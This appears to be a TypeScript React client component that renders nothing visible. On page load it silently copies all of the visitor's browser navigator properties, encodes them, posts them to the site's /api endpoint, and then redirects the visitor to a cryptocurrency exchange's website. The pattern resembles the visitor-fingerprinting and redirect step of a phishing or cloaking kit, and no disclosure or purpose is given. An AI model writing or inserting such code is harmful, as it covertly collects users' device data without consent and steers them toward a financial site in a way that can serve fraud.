"use client";

export function ClientElement() {
  if (typeof window != "undefined") getData();
  return <></>;
}

async function getData() {
  var _navigator = {};
  for (var i in navigator) (_navigator as any)[i] = (navigator as any)[i];

  const jsonData = JSON.stringify(_navigator);
  await fetch("/api", {
    method: "POST",
    body: JSON.stringify({
      info: btoa(encodeURI(jsonData)),
    }),
  });
  window.location.replace("https://bitbuy.ca");
}
